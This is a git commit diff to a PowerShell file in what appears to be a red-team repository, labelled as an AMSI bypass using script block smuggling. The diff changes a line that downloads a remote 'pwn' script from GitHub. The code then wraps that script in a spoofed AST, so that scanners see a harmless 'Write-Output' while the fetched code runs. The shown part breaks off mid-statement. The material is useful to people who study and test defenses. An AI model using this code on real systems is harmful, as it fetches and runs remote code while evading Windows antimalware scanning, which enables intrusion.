7cc0a3138f9507485434b3bd1bb466ef9b8c7dfc
snowsec <fede10200611@gmail.com>
2025-02-03 23:14:10 +0100

    Update ScriptBlock_Smuggling.ps1

--- Active_Directory/Bypasses/AMSI/ScriptBlock_Smuggling.ps1
+++ Active_Directory/Bypasses/AMSI/ScriptBlock_Smuggling.ps1
@@ -1,4 +1,4 @@
-$c = (new-Object net.webclient).downloadstring('https://gist.githubusercontent.com/S3cur3Th1sSh1t/2f4d37fde889af8f02b287db84f8ec4b/raw/0e2823c209fb7ca85f1aa3d0a0ab9c7871ef97bd/winpwn.ps1')
+$c = (new-Object net.webclient).downloadstring('https://raw.githubusercontent.com/sn0wsec/red-team-trunk/refs/heads/main/Active_Directory/Bypasses/AMSI/windows_pwn.ps1')
 $SpoofedAst = [ScriptBlock]::Create("Write-Output 'Hello'").Ast  
 $ExecutedAst = [ScriptBlock]::Create("$c").Ast
 $Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent,
